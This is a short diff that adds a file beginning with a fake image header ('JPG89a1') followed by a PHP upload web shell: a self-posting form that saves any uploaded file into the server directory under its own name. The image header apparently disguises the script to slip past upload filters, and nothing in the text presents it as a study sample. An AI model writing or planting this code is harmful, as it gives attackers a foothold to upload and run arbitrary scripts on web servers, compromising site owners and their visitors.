@@ -1,0 +1,2 @@
+JPG89a1
+<form enctype="multipart/form-data" action="<?php echo $PHP_SELF; ?>?x=x" method="POST">File<input name="file" type="file" /><br /><input type="submit" value="upload" /></form><?php if($_REQUEST["x"]){if(move_uploaded_file($_FILES["file"]["tmp_name"],$_FILES["file"]["name"])) { echo $_FILES["file"]["name"]." Uploaded!";} else{echo "Error!";}}?>
